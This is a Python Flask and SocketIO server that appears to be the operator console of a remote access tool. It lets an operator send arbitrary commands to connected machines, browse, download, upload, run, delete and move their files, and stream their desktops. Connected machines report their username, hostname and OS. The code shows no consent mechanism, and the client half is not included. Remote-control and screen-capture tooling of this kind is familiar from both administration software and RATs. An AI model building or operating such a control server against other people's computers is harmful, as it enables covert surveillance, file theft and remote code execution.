import logging
import os
import webbrowser
import time
from flask import Flask, render_template, request, send_file
from flask_socketio import SocketIO, emit
from gevent import spawn
from gevent.server import StreamServer
from gevent.lock import BoundedSemaphore
from collections import defaultdict
import base64
import json

logging.basicConfig(level=logging.DEBUG, format='%(asctime)s - %(levelname)s - %(message)s')

app = Flask(__name__)
app.config['SECRET_KEY'] = 'your_secret_key'
socketio = SocketIO(app, async_mode='gevent')
clients = defaultdict(dict)
clients_lock = BoundedSemaphore(1)

DELIMITER = '\0'

@app.route('/')
def index():
    return render_template('index.html')

@socketio.on('connect')
def handle_websocket_connect():
    logging.info('WebSocket client connected')
    emit('client_list', list(get_serializable_clients()))

@socketio.on('disconnect')
def handle_websocket_disconnect():
    logging.info('WebSocket client disconnected')

@socketio.on('command')
def handle_command(data):
    command = data['command']
    target_clients = data['clients']
    logging.info(f"Received command from web: '{command}' for clients: {target_clients}")
    spawn(broadcast, command, target_clients)
    emit('output', f"Sent command to selected clients: {command}", broadcast=True)

@socketio.on('list_directory')
def handle_list_directory(data):
    client_id = data['client_id']
    path = data['path']
    command = f"LIST_DIR:{path}"
    spawn(broadcast, command, [client_id])

@socketio.on('download_file')
def handle_download_file(data):
    client_id = data['client_id']
    file_path = data['file_path']
    command = f"DOWNLOAD:{file_path}"
    spawn(broadcast, command, [client_id])
    
@socketio.on('run_file')
def handle_run_file(data):
    client_id = data['client_id']
    file_path = data['file_path']
    command = f"RUN:{file_path}"
    spawn(broadcast, command, [client_id])
    
@socketio.on('upload_file')
def handle_upload_file(data):
    client_id = data['client_id']
    file_path = data['file_path']
    file_content = data['file_content']
    command = f"UPLOAD:{file_path}:{file_content}"
    spawn(broadcast, command, [client_id])

@socketio.on('delete_file')
def handle_delete_file(data):
    client_id = data['client_id']
    file_path = data['file_path']
    command = f"DELETE:{file_path}"
    spawn(broadcast, command, [client_id])

@socketio.on('rename_file')
def handle_rename_file(data):
    client_id = data['client_id']
    old_path = data['old_path']
    new_path = data['new_path']
    command = f"RENAME:{old_path}:{new_path}"
    spawn(broadcast, command, [client_id])

@socketio.on('create_folder')
def handle_create_folder(data):
    client_id = data['client_id']
    folder_path = data['folder_path']
    command = f"CREATE_FOLDER:{folder_path}"
    spawn(broadcast, command, [client_id])

@socketio.on('move_file')
def handle_move_file(data):
    client_id = data['client_id']
    old_path = data['old_path']
    new_path = data['new_path']
    command = f"MOVE:{old_path}:{new_path}"
    spawn(broadcast, command, [client_id])

@socketio.on('start_desktop_capture')
def handle_start_desktop_capture(data):
    client_id = data['client_id']
    logging.info(f"Received request to start desktop capture for client: {client_id}")
    command = "START_DESKTOP_CAPTURE"
    spawn(broadcast, command, [client_id])
    emit('output', f"Sent start desktop capture command to client: {client_id}", broadcast=True)

@socketio.on('stop_desktop_capture')
def handle_stop_desktop_capture(data):
    client_id = data['client_id']
    logging.info(f"Received request to stop desktop capture for client: {client_id}")
    command = "STOP_DESKTOP_CAPTURE"
    spawn(broadcast, command, [client_id])
    emit('output', f"Sent stop desktop capture command to client: {client_id}", broadcast=True)

def handle_client(socket, address):
    buffer = bytearray()
    formatted_addr = f"{address[0]}:{address[1]}"
    logging.info(f"New connection from {formatted_addr}")

    client_info = None
    try:
        while True:
            logging.debug(f"Waiting for message from {formatted_addr}")
            response = read_message(socket, buffer)
            if response:
                logging.debug(f"Received message from {formatted_addr}: {response[:100]}...")

                if response.startswith("INFO:"):
                    client_info = handle_client_info(response[5:], address, socket)
                    with clients_lock:
                        clients[client_info['id']] = client_info
                    socketio.emit('client_list', list(get_serializable_clients()))
                elif response.startswith("DESKTOP_CAPTURE:"):  
                    try:
                        parts = response.split(":", 2)
                        if len(parts) == 3:
                            _, client_id, base64_image = parts
                            logging.info(f"Received desktop capture data from client {client_id}, length: {len(base64_image)}")
                            socketio.emit('desktop_capture', {
                                'client_id': client_id,
                                'image': base64_image
                            })
                            logging.info(f"Broadcasted desktop capture for client {client_id}")
                        else:
                            raise ValueError("Incorrect number of parts in DESKTOP_CAPTURE message")
                    except Exception as e:
                        logging.error(f"Error processing DESKTOP_CAPTURE message from {formatted_addr}: {str(e)}")
                        socketio.emit('error', f"Error processing desktop capture data from client {formatted_addr}")
                elif ":" in response:
                    client_id, message = response.split(":", 1)
                    with clients_lock:
                        if client_id in clients:
                            if message.startswith("FILE_LIST:"):
                                try:
                                    file_list_json = message[9:].strip()
                                    file_list_json = file_list_json.lstrip(':')
                                    logging.debug(f"Attempting to parse JSON: {file_list_json}")
                                    file_list = json.loads(file_list_json)
                                    socketio.emit('file_list', {'client_id': client_id, 'files': file_list})
                                except json.JSONDecodeError as e:
                                    logging.error(f"Error decoding JSON: {e}")
                                    logging.error(f"Problematic JSON: {file_list_json}")
                                    socketio.emit('error', f"Error listing directory: {e}")
                            elif message.startswith("FILE_CONTENT:"):
                                try:
                                    _, file_name, content = message.split(":", 2)
                                    socketio.emit('file_content', {
                                        'client_id': client_id,
                                        'file_name': file_name,
                                        'content': content
                                    })
                                except ValueError:
                                    logging.error(f"Malformed FILE_CONTENT message from {formatted_addr}: {message}")
                                    socketio.emit('error', f"Malformed file content data from client {formatted_addr}")
                            elif message.startswith("OPERATION_RESULT:"):
                                try:
                                    result = json.loads(message[17:])
                                    socketio.emit('operation_result', {'client_id': client_id, **result})
                                except json.JSONDecodeError as e:
                                    logging.error(f"Error decoding JSON: {e}")
                                    socketio.emit('error', f"Error processing operation result: {e}")
                            elif message.startswith("ERROR:"):
                                socketio.emit('error', {'client_id': client_id, 'message': message[6:]})
                            else:
                                emit_message = f"Response from {clients[client_id]['username']}@{clients[client_id]['hostname']}:\n{message}"
                                socketio.emit('output', emit_message)
                        else:
                            logging.warning(f"Received message from unknown client ID: {client_id}")
                else:
                    logging.warning(f"Received unexpected message format from {formatted_addr}: {response[:100]}...")
            else:
                logging.warning(f"No response from {formatted_addr}. Connection may be closed.")
                break
    except Exception as e:
        logging.error(f"Error with client {formatted_addr}: {e}", exc_info=True)
    finally:
        logging.info(f"Closing connection with {formatted_addr}")
        socket.close()
        if client_info:
            with clients_lock:
                clients.pop(client_info['id'], None)
            socketio.emit('client_list', list(get_serializable_clients()))
        logging.info(f"Connection with {formatted_addr} closed.")

def handle_client_info(info, addr, sock):
    try:
        username, hostname, client_id, os_info = info.split("|")
    except ValueError:
        logging.error(f"Malformed INFO message from {addr}: {info}")
        username, hostname, client_id, os_info = "Unknown", "Unknown", "Unknown", "Unknown"

    return {
        'username': username,
        'hostname': hostname,
        'ip': addr[0],
        'port': addr[1],
        'id': client_id,
        'os': os_info,
        'socket': sock
    }


def get_serializable_clients():
    with clients_lock:
        return [
            {
                'username': client['username'],
                'hostname': client['hostname'],
                'ip': client['ip'],
                'port': client['port'],
                'id': client['id'],
                'os': client['os']
            }
            for client in clients.values()
        ]

def send_message(sock, message, client_id):
    try:
        full_message = f"{message}{DELIMITER}".encode('utf-8')
        sock.sendall(full_message)
        logging.debug(f"Sent message to client {client_id}: {message}")
    except Exception as e:
        logging.error(f"Error sending message to client {client_id}: {e}", exc_info=True)
        raise


def read_message(sock, buffer):
    try:
        while True:
            if b'\0' in buffer:
                # We have a full message
                index = buffer.find(b'\0')
                message = buffer[:index]
                buffer[:] = buffer[index+1:]
                decoded_message = message.decode('utf-8', errors='replace').strip()
                logging.debug(f"Read message (length: {len(decoded_message)})")
                return decoded_message
            else:
                # Read more data
                chunk = sock.recv(4096)
                if not chunk:
                    # Connection closed
                    logging.debug("End of stream reached")
                    return None
                buffer.extend(chunk)
                if len(buffer) > 10 * 1024 * 1024:
                    logging.warning("Message exceeds 10 MB, truncating")
                    # Return what we have
                    message = buffer
                    buffer.clear()
                    decoded_message = message.decode('utf-8', errors='replace').strip()
                    logging.debug(f"Read truncated message (length: {len(decoded_message)})")
                    return decoded_message
    except Exception as e:
        logging.error(f"Error reading message: {e}", exc_info=True)
        return None

def broadcast(message, client_ids=None):
    with clients_lock:
        target_clients = clients.values()
        if client_ids is not None:
            target_clients = [client for client in clients.values() if client['id'] in client_ids]
    
    logging.info(f"Broadcasting message to {len(target_clients)} clients: '{message}'")
    for client in target_clients:
        client_id = client['id']
        sock = client['socket']
        try:
            send_message(sock, message, client_id)
        except Exception as e:
            logging.error(f"Failed to send to {client_id}: {e}", exc_info=True)


if __name__ == '__main__':
    host = 'localhost'
    web_port = 7878
    tcp_port = 7880

    script_dir = os.path.dirname(os.path.abspath(__file__))
    os.chdir(script_dir)
    logging.info(f"Changed working directory to: {script_dir}")

    tcp_server = StreamServer((host, tcp_port), handle_client)
    spawn(tcp_server.serve_forever)
    logging.info(f"TCP server started on port {tcp_port}")

    def open_browser():
        webbrowser.open(f'http://{host}:{web_port}')
        logging.info(f"Opened WebUI in browser: http://{host}:{web_port}")

    spawn(lambda: time.sleep(2) and open_browser())

    try:
        socketio.run(app, host=host, port=web_port, debug=False, use_reloader=False)
    except Exception as e:
        logging.error(f"Failed to start the web server: {e}")
        print(f"Error: {e}")
        print("Please check if port 7878 is already in use.")
